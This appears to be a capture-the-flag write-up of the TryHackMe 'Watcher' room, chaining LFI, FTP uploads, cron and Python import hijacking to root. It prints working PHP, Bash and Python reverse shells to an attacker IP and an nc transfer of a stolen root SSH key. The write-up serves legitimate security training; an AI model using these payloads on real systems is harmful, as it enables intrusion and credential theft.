# Watcher — TryHackMe

**Difficulty:** Medium ☀️

**Topics:** Linux · Enumeration · LFI · FTP · Reverse Shell · Cron Job Hijacking · Python Import Hijacking · SSH

---

## 1. Enumeration

Started with an Nmap scan to identify open ports and running services.

```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

The scan revealed the following services:

| Port | Service | Version |
|---|---|---|
| 21 | FTP | vsftpd 3.0.5 |
| 22 | SSH | OpenSSH 8.2p1 |
| 80 | HTTP | Apache 2.4.41 |

The web server was running a website built with Jekyll 4.1.1.

During web enumeration, I checked `robots.txt` and discovered two interesting paths:

- `flag_1.txt` — contained the first flag.
- `secret_file_do_not_read.txt` — a potentially interesting file that returned `403 Forbidden` when accessed directly.

Further inspection of the website revealed that posts were loaded through `post.php`, using a parameter called `post`.

Example:

```text
http://watcher.thm/post.php?post=striped.php
```

This parameter became the starting point for investigating a possible Local File Inclusion vulnerability.

## 2. LFI — Local File Inclusion

By testing the `post` parameter, I discovered that it was possible to read local files from the target system.

First, I accessed `/etc/passwd` to enumerate system users:

```text
http://watcher.thm/post.php?post=/etc/passwd
```

Among the discovered users were:

- `will`
- `mat`
- `toby`
- `ftpuser`

I then used the same vulnerability to access the previously discovered secret file:

```text
http://watcher.thm/post.php?post=secret_file_do_not_read.txt
```

The file contained a message from Will to Mat, including FTP credentials and information about the FTP upload directory:

```text
Hi Mat,

The credentials for the FTP server are below.
I've set the files to be saved to /home/ftpuser/ftp/files.

Will

----------
ftpuser:<PASSWORD>
```

This provided valid FTP credentials and revealed the location where uploaded files were stored.

## 3. Initial Access — FTP and PHP Reverse Shell

Using the credentials found in the secret file, I connected to the FTP server:

```bash
ftp <TARGET_IP>
```

After authentication, I navigated to the `files` directory:

```text
ftp> cd files
```

The directory allowed file uploads.

Since I had already discovered an LFI vulnerability, I decided to combine both vulnerabilities: upload a PHP reverse shell through FTP and then execute it through the vulnerable web application.

I created a PHP reverse shell:

```php
<?php
$ip = "192.168.128.18";
$port = 4444;

$sock = fsockopen($ip, $port);
$descriptors = array(
    0 => $sock,
    1 => $sock,
    2 => $sock
);

$process = proc_open("/bin/bash -i", $descriptors, $pipes);
?>
```

The IP address was my Kali Linux VPN address, and port `4444` was used for the reverse connection.

I uploaded the file to the FTP server:

```text
ftp> put php-reverse-shell.php
```

On Kali, I started a Netcat listener:

```bash
nc -lvnp 4444
```

Next, I used the LFI vulnerability to include the uploaded PHP file:

```text
http://watcher.thm/post.php?post=/home/ftpuser/ftp/files/php-reverse-shell.php
```

The web server executed the PHP code and established a reverse connection to my Kali machine.

I successfully obtained a shell as:

```text
www-data
```

## 4. Privilege Escalation

### 4.1. www-data → toby — Sudo Misconfiguration

The first step was checking the available sudo permissions:

```bash
sudo -l
```

The output revealed:

```text
User www-data may run:
    (toby) NOPASSWD: ALL
```

This meant that `www-data` could execute any command as `toby` without providing a password.

I used this permission to switch to Toby:

```bash
sudo -u toby /bin/bash
```

Successfully obtained a shell as `toby`.

### 4.2. toby → mat — Cron Job Hijacking

While exploring Toby's home directory, I discovered a `jobs` directory containing a script called `cow.sh`.

Its original contents were:

```bash
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
```

I checked the system cron configuration:

```bash
cat /etc/crontab
```

One of the entries was:

```text
*/1 * * * * mat /home/toby/jobs/cow.sh
```

This meant that the script was executed every minute by the user `mat`.

The important detail was that Toby had write permissions on `cow.sh`.

Since the script was executed with Mat's privileges, modifying its contents allowed me to execute commands as Mat.

I replaced the original script with a reverse shell:

```bash
#!/bin/bash
bash -c "bash -i >& /dev/tcp/192.168.128.18/4444 0>&1"
```

On Kali, I started a listener:

```bash
nc -lvnp 4444
```

After the next cron execution, I received a reverse shell as:

```text
mat
```

### 4.3. mat → will — Python Import Hijacking

After obtaining Mat's shell, I checked the available sudo permissions:

```bash
sudo -l
```

The output revealed:

```text
User mat may run:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

I inspected the Python script:

```python
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
    print("Invalid command!")
    exit()

os.system(cmd)
```

The script imported a function called `get_command` from a local module named `cmd.py`.

The original `cmd.py` contained:

```python
def get_command(num):
    if num == "1":
        return "ls -lah"
    if num == "2":
        return "id"
    if num == "3":
        return "cat /etc/passwd"
```

The important discovery was that `cmd.py` was owned by Mat and could be modified by him.

Python executes the top-level code of an imported module during the import process. This happens before the main script continues executing.

Therefore, modifying `cmd.py` allowed me to execute arbitrary Python code with the privileges of the user running `will_script.py`.

I replaced the contents of `cmd.py` with a Python reverse shell:

```python
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.128.18", 4445))

for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)

subprocess.call(["/bin/bash", "-i"])
```

On Kali, I started a listener on port `4445`:

```bash
nc -lvnp 4445
```

Then, from Mat's shell, I executed the script as Will:

```bash
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
```

When Python encountered:

```python
from cmd import get_command
```

it imported the modified `cmd.py` and executed the reverse shell before reaching the whitelist check.

As a result, I obtained a shell as:

```text
will
```

### 4.4. will → root — SSH Private Key

After obtaining Will's shell, I continued enumerating the system.

I checked SUID binaries and Linux capabilities, but did not find an immediately useful privilege escalation vector.

While exploring the filesystem, I discovered an interesting file:

```text
/opt/backups/key.b64
```

The file contained Base64-encoded data.

After decoding it, I discovered that it was an RSA private key.

I decoded the file:

```bash
base64 -d /opt/backups/key.b64 > /tmp/root_key
```

Then restricted its permissions:

```bash
chmod 600 /tmp/root_key
```

Since I wanted to use the key from Kali, I transferred it using Netcat.

On Kali:

```bash
nc -lvnp 5555 > root_key
```

From the target machine:

```bash
nc 192.168.128.18 5555 < /tmp/root_key
```

After receiving the file, I set the correct permissions on Kali:

```bash
chmod 600 root_key
```

Finally, I used the private key to connect to the target as root:

```bash
ssh -i root_key root@<TARGET_IP>
```

Successfully obtained a root shell and completed the room.

---

## 5. What I Learned

During this room, I practiced several Linux and web exploitation techniques:

- **Local File Inclusion (LFI):** Reading local files through a vulnerable PHP parameter.
- **FTP exploitation:** Using discovered credentials to upload a malicious PHP file.
- **Reverse shells:** Establishing remote command execution through PHP, Bash and Python.
- **Sudo misconfiguration:** Exploiting overly permissive sudo rules.
- **Cron Job Hijacking:** Modifying a writable script executed periodically by another user.
- **Python Import Hijacking:** Executing arbitrary code during the import of a writable Python module.
- **SSH authentication:** Extracting and using a Base64-encoded RSA private key.

## 6. Conclusion

Watcher was a good exercise in Linux privilege escalation and chaining multiple vulnerabilities together.

The most interesting technique for me was Python Import Hijacking. Understanding that Python executes a module's top-level code during import was the key to obtaining access as Will.

The room also demonstrated how seemingly harmless configuration mistakes — writable scripts, overly permissive sudo rules and exposed private keys — can be chained together to gain full control of a system.

**Room completed.** ☀️
